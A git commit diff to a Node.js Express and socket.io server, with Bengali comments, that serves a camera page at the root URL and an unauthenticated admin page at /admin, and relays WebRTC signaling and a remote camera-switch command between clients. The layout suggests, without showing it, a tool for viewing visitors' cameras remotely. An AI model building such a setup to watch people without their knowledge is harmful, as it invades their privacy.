c98ac846767cc828f834ae1bff965edc96bba0ab
Arifur <biplobc384@gmail.com>
2026-06-09 01:17:08 -0400

    Your update message

--- server.js
+++ server.js
@@ -2,18 +2,29 @@ const express = require('express');
 const app = express();
 const http = require('http').Server(app);
 const io = require('socket.io')(http);
+const path = require('path');
 
+// মূল লিঙ্কে (Root URL) ঢুকলে সরাসরি ক্যামেরা ওপেন হবে
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public/camera.html'));
+});
+
+// লিঙ্কের শেষে /admin লিখলে অ্যাডমিন প্যানেল ওপেন হবে
+app.get('/admin', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public/admin.html'));
+});
+
+// স্ট্যাটিক ফাইলের জন্য
 app.use(express.static('public'));
 
+// WebRTC Signaling & Socket.io
 io.on('connection', (socket) => {
     console.log('A user connected:', socket.id);
 
-    // WebRTC Signaling Events
     socket.on('offer', (data) => socket.broadcast.emit('offer', data));
     socket.on('answer', (data) => socket.broadcast.emit('answer', data));
     socket.on('candidate', (data) => socket.broadcast.emit('candidate', data));
 
-    // Remote Camera Switch Command
     socket.on('switchCamera', () => {
         socket.broadcast.emit('switchCamera');
     });
@@ -23,6 +34,7 @@ io.on('connection', (socket) => {
     });
 });
 
+// সার্ভার পোর্ট
 const PORT = process.env.PORT || 3000;
 http.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
